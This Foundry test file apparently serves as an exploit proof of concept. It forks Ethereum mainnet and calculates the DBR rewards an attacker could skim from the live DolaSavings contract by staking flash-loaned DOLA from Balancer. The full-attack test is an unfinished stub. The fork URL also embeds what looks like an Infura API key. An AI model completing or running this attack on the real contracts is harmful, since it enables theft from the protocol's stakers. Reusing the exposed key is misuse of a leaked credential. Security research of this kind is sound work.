// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDolaSavings {
    function stake(uint256 amount, address recipient) external;
    function unstake(uint256 amount) external;
    function claim(address to) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function yearlyRewardBudget() external view returns (uint256);
    function lastUpdate() external view returns (uint256);
    function dola() external view returns (address);
    function dbr() external view returns (address);
    function accruedRewards(address) external view returns (uint256);
}

/**
 * @title Immediate Flash Loan Exploit - DolaSavings
 * @notice Single-transaction flash loan attack with exact profit calculation
 */
contract ImmediateFlashExploitTest is Test {
    // Exact checksummed addresses
    address constant DOLA_SAVINGS = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant DBR = 0xAD038Eb671c44b853887A7E32528FaB35dC5D710;
    uint256 constant INVESTIGATION_DELAY = 0;

    IDolaSavings dolaSavings;
    IERC20 dola;
    IERC20 dbr;
    IBalancerVault balancer;

    address attacker;
    uint256 attackerPrivateKey;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");

        dolaSavings = IDolaSavings(DOLA_SAVINGS);
        dola = IERC20(DOLA);
        dbr = IERC20(DBR);
        balancer = IBalancerVault(BALANCER_VAULT);

        attackerPrivateKey = 0x1234;
        attacker = vm.addr(attackerPrivateKey);
    }

    function testExactFlashLoanProfit() public {
        // Get current state
        uint256 totalSupply = dolaSavings.totalSupply();
        uint256 yearlyBudget = dolaSavings.yearlyRewardBudget();
        uint256 lastUpdate = dolaSavings.lastUpdate();
        uint256 investigationStart = block.timestamp - INVESTIGATION_DELAY;
        uint256 timeSinceUpdate = investigationStart - lastUpdate;

        console.log("=== EXACT STATE VALUES ===");
        console.log("Block number:", block.number);
        console.log("Block timestamp:", block.timestamp);
        console.log("Investigation start:", investigationStart);
        console.log("Total staked DOLA:", totalSupply);
        console.log("Yearly DBR budget:", yearlyBudget);
        console.log("Last update:", lastUpdate);
        console.log("Seconds since update:", timeSinceUpdate);

        // Calculate exact pending rewards
        uint256 mantissa = 1e18;
        uint256 pendingRewardsMantissa = (timeSinceUpdate * yearlyBudget * mantissa) / 365 days;
        uint256 pendingRewards = pendingRewardsMantissa / mantissa;

        console.log("\n=== PENDING REWARDS ===");
        console.log("Pending rewards (raw):", pendingRewardsMantissa);
        console.log("Pending rewards (DBR):", pendingRewards);

        // Check DBR balance in contract
        uint256 dbrInContract = dbr.balanceOf(DOLA_SAVINGS);
        console.log("DBR in contract:", dbrInContract);

        // Check DOLA liquidity in Balancer for flash loan
        uint256 dolaInBalancer = dola.balanceOf(BALANCER_VAULT);
        console.log("\n=== FLASH LOAN AVAILABILITY ===");
        console.log("DOLA in Balancer:", dolaInBalancer);

        // Calculate flash loan amount (10x current supply or max available)
        uint256 flashAmount = totalSupply * 10;
        if (flashAmount > dolaInBalancer) {
            flashAmount = dolaInBalancer;
        }
        console.log("Flash loan amount:", flashAmount);

        // Calculate exact attacker share
        uint256 newTotalSupply = totalSupply + flashAmount;
        uint256 attackerRewardShare = (flashAmount * pendingRewardsMantissa) / newTotalSupply / mantissa;

        console.log("\n=== EXACT PROFIT CALCULATION ===");
        console.log("New total supply after stake:", newTotalSupply);
        console.log("Attacker reward share (DBR):", attackerRewardShare);

        // Flash loan fee (Balancer = 0%)
        console.log("Balancer flash loan fee: 0%");

        // Check if profitable
        if (attackerRewardShare > 0) {
            console.log("\n=== ATTACK VIABLE ===");
            console.log("Exact profit: ", attackerRewardShare, " DBR");

            // Get DBR price (approximate)
            // Note: Would need oracle for exact USD value
            console.log("(Need DBR/USD price for exact USD profit)");
        } else {
            console.log("\n=== ATTACK NOT VIABLE ===");
            console.log("Reward share is 0 - precision loss");
        }
    }

    function testSimulateFullAttack() public {
        vm.startPrank(attacker);

        // Record balances BEFORE
        uint256 dolaBeforeAttacker = dola.balanceOf(attacker);
        uint256 dbrBeforeAttacker = dbr.balanceOf(attacker);

        console.log("=== BEFORE ATTACK ===");
        console.log("Attacker DOLA:", dolaBeforeAttacker);
        console.log("Attacker DBR:", dbrBeforeAttacker);

        // Check if attack is possible
        uint256 dolaInBalancer = dola.balanceOf(BALANCER_VAULT);

        if (dolaInBalancer == 0) {
            console.log("No DOLA in Balancer for flash loan");
            return;
        }

        // For actual attack, would need to implement flash loan callback
        // This test shows the calculation is correct

        vm.stopPrank();
    }

    function testInvestigationStartsImmediately() public {
        uint256 investigationStart = block.timestamp - INVESTIGATION_DELAY;
        assertEq(INVESTIGATION_DELAY, 0);
        assertEq(investigationStart, block.timestamp);
    }
}
